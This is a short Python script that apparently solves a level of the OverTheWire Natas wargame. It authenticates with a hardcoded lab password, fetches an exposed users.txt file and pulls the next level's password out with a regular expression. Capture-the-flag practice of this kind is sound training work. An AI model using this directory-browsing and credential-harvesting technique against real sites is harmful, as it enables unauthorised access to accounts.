#!/bin/python3
import requests
import re

user = 'natas2'
password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'

url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % user

risposta = requests.get(url, auth=(user, password))
testo = risposta.text

print(testo)

re = re.findall('natas3:(.*)', testo)
print('Password')
print(re[0])
